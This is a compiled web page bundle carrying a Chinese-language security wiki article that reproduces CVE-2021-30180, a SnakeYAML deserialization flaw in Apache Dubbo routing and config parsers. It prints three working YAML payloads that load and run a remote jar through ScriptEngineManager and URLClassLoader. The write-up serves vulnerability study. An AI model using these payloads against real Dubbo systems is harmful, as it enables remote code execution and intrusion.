"use strict";(self.webpackChunkwhoopsunix_wiki=self.webpackChunkwhoopsunix_wiki||[]).push([[319],{45379:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>p,frontMatter:()=>o,metadata:()=>t,toc:()=>l});var r=a(85893),s=a(11151);const o={sidebar_position:1,tags:["CVE","Dubbo","Deserialization","SnakeYaml"]},i="CVE-2021-30180 Apache Dubbo Tag routing Yaml pre-auth \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e GHSL-2021-040\u3001GHSL-2021-041\u3001GHSL-2021-043",t={id:"components/Dubbo/CVE-2021-30180",title:"CVE-2021-30180 Apache Dubbo Tag routing Yaml pre-auth \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e GHSL-2021-040\u3001GHSL-2021-041\u3001GHSL-2021-043",description:"\u6982\u8ff0",source:"@site/docs/03-components/Dubbo/CVE-2021-30180.md",sourceDirName:"03-components/Dubbo",slug:"/components/Dubbo/CVE-2021-30180",permalink:"/docs/components/Dubbo/CVE-2021-30180",draft:!1,unlisted:!1,editUrl:"https://github.com/Whoopsunix/whoopsunix.github.io/docs/03-components/Dubbo/CVE-2021-30180.md",tags:[{label:"CVE",permalink:"/docs/tags/cve"},{label:"Dubbo",permalink:"/docs/tags/dubbo"},{label:"Deserialization",permalink:"/docs/tags/deserialization"},{label:"SnakeYaml",permalink:"/docs/tags/snake-yaml"}],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1,tags:["CVE","Dubbo","Deserialization","SnakeYaml"]},sidebar:"tutorialSidebar",previous:{title:"CVE-2021-30179 Apache Dubbo Generic filter \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e GHSL-2021-037 GHSL-2021-038",permalink:"/docs/components/Dubbo/CVE-2021-30179"},next:{title:"CVE-2021-30181 Apache Dubbo cluster scriptEngine pre-auth \u4ee3\u7801\u6267\u884c\u6f0f\u6d1e GHSL-2021-042",permalink:"/docs/components/Dubbo/CVE-2021-30181"}},c={},l=[{value:"\u6982\u8ff0",id:"\u6982\u8ff0",level:2},{value:"\u5f71\u54cd\u7248\u672c",id:"\u5f71\u54cd\u7248\u672c",level:3},{value:"\u590d\u73b0\u5206\u6790",id:"\u590d\u73b0\u5206\u6790",level:2},{value:"TagRuleParser",id:"tagruleparser",level:3},{value:"ConditionRuleParser",id:"conditionruleparser",level:3},{value:"ConfigParser",id:"configparser",level:3}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,s.a)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"cve-2021-30180-apache-dubbo-tag-routing-yaml-pre-auth-\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e-ghsl-2021-040ghsl-2021-041ghsl-2021-043",children:"CVE-2021-30180 Apache Dubbo Tag routing Yaml pre-auth \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e GHSL-2021-040\u3001GHSL-2021-041\u3001GHSL-2021-043"}),"\n",(0,r.jsx)(n.h2,{id:"\u6982\u8ff0",children:"\u6982\u8ff0"}),"\n",(0,r.jsx)(n.h3,{id:"\u5f71\u54cd\u7248\u672c",children:"\u5f71\u54cd\u7248\u672c"}),"\n",(0,r.jsx)(n.p,{children:"2.6.10\u3001[2.7.0, 2.7.9]"}),"\n",(0,r.jsxs)(n.p,{children:["\u9996\u5148\u770b\u4e00\u4e0b ",(0,r.jsx)(n.a,{href:"https://lists.apache.org/thread/v9s10y8r7obof0yo9vp8c5hsn746zvkh",children:"\u6f0f\u6d1e\u62ab\u9732\u90ae\u4ef6"})," \u662f\u8fd9\u6837\u63cf\u8ff0\u7684\uff0cDubbo \u652f\u6301\u914d\u7f6e\u8986\u76d6\uff0c\u8fd9\u4e9b\u914d\u7f6e\u88ab\u52a0\u8f7d\u5230\u914d\u7f6e\u4e2d\u5fc3\uff08Zookeeper, Nacos\u7b49\uff09\u3002Dubbo \u53ef\u4ee5\u914d\u7f6e ",(0,r.jsx)(n.a,{href:"https://dubbo.apache.org/en/docs/v2.7/user/examples/routing-rule/#tag-routing-rules",children:"Tag routing"})," \u89c4\u5219\u4f7f\u5f97 customer \u8bf7\u6c42\u5230\u6b63\u786e\u7aef\u70b9\uff0c\u8be5\u8fc7\u7a0b\u7531 yaml \u89e3\u6790\uff0c\u6240\u4ee5\u5b58\u5728\u9884\u6388\u6743\u53cd\u5e8f\u5217\u5316\u3002"]}),"\n",(0,r.jsx)(n.h2,{id:"\u590d\u73b0\u5206\u6790",children:"\u590d\u73b0\u5206\u6790"}),"\n",(0,r.jsx)(n.h3,{id:"tagruleparser",children:"TagRuleParser"}),"\n",(0,r.jsxs)(n.p,{children:["\u901a\u8fc7 ",(0,r.jsx)(n.code,{children:"TagRouter"})," \u89e6\u53d1 ",(0,r.jsx)(n.code,{children:"org.apache.dubbo.rpc.cluster.router.tag.model.TagRuleParser#parse()"})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20240204100107693",src:a(1230).Z+"",width:"1684",height:"1000"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u4e2a\u6f0f\u6d1e\u6bd4\u8f83\u597d\u8ddf\uff0c\u76f4\u63a5\u5c31\u80fd\u5b9a\u4f4d\u5230 ",(0,r.jsx)(n.code,{children:"org.apache.dubbo.rpc.cluster.router.tag.TagRouter#notify()"})," \u7136\u540e\u6309\u7167 ",(0,r.jsx)(n.code,{children:"ruleRepository.getRule()"})," \u89e3\u6790\u7684\u8981\u6c42\u53bb\u6784\u9020\u5c31\u80fd\u590d\u73b0\u4e86\u3002"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20240204100305200",src:a(3425).Z+"",width:"1802",height:"472"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:'---\ntags:\n- name: pwn\n  addresses:\n    - !!javax.script.ScriptEngineManager [\n        !!java.net.URLClassLoader [[\n          !!java.net.URL ["http://127.0.0.1:1234/SnakeyamlDemo-1.0.jar"]\n        ]]\n      ]\n'})}),"\n",(0,r.jsx)(n.h3,{id:"conditionruleparser",children:"ConditionRuleParser"}),"\n",(0,r.jsxs)(n.p,{children:["\u901a\u8fc7 ",(0,r.jsx)(n.code,{children:"ListenableRouter"})," \u89e6\u53d1\u7684 ",(0,r.jsx)(n.code,{children:"org.apache.dubbo.rpc.cluster.router.condition.config.model.ConditionRuleParser"})," \u4e5f\u5b58\u5728\u95ee\u9898"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20240204105004759",src:a(75032).Z+"",width:"1628",height:"940"})}),"\n",(0,r.jsx)(n.p,{children:"\u9650\u5b9a\u4e86 Constructor\uff0c\u6240\u4ee5\u8fd8\u5f97\u5305\u88c5\u4e00\u4e0b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:'---\nconditions:\n - !!javax.script.ScriptEngineManager [\n   !!java.net.URLClassLoader [[\n     !!java.net.URL ["http://127.0.0.1:1234/SnakeyamlDemo-1.0.jar"]\n   ]]\n ]\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20240204105023629",src:a(84057).Z+"",width:"1576",height:"714"})}),"\n",(0,r.jsx)(n.h3,{id:"configparser",children:"ConfigParser"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"org.apache.dubbo.rpc.cluster.configurator.parser.ConfigParser#parseObject()"})," \u4e5f\u5b58\u5728\u95ee\u9898"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20240204165501839",src:a(57010).Z+"",width:"1556",height:"454"})}),"\n",(0,r.jsx)(n.p,{children:"payload"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:'---\nconfigs:\n - !!javax.script.ScriptEngineManager [\n   !!java.net.URLClassLoader [[\n     !!java.net.URL ["http://127.0.0.1:1234/SnakeyamlDemo-1.0.jar"]\n   ]]\n ]\n'})}),"\n",(0,r.jsxs)(n.p,{children:["Dubbo \u914d\u7f6e\u76f8\u5173\u7684\u6f0f\u6d1e\u89e6\u53d1\u8d77\u6765\u90fd\u4e0d\u96be\uff0c\u5728\u8fd9\u4e24\u4e2a\u7c7b\u6253\u65ad\u70b9\uff0c\u57fa\u672c\u4e0a\u5c31\u80fd\u77e5\u9053\u9700\u8981\u4ec0\u4e48\u914d\u7f6e\u4e86 ",(0,r.jsx)(n.code,{children:"org.apache.dubbo.common.config.configcenter.DynamicConfiguration"}),"\u3001",(0,r.jsx)(n.code,{children:"org.apache.dubbo.common.config.Environment"}),"\u3002"]})]})}function p(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},1230:(e,n,a)=>{a.d(n,{Z:()=>r});const r=a.p+"assets/images/image-20240204100107693-58c56c05d312f8c2052a26aada0c4e9a.png"},3425:(e,n,a)=>{a.d(n,{Z:()=>r});const r=a.p+"assets/images/image-20240204100305200-0ff4468c03bed21f503b0fd656135f04.png"},75032:(e,n,a)=>{a.d(n,{Z:()=>r});const r=a.p+"assets/images/image-20240204105004759-c70067bb6815dee0e2f33578c14fece5.png"},84057:(e,n,a)=>{a.d(n,{Z:()=>r});const r=a.p+"assets/images/image-20240204105023629-5979c5fb890ea8f311b56f3ca89ce797.png"},57010:(e,n,a)=>{a.d(n,{Z:()=>r});const r=a.p+"assets/images/image-20240204165501839-41be73283f0a3235f1909fb09a8ea676.png"},11151:(e,n,a)=>{a.d(n,{Z:()=>t,a:()=>i});var r=a(67294);const s={},o=r.createContext(s);function i(e){const n=r.useContext(o);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),r.createElement(o.Provider,{value:n},e.children)}}}]);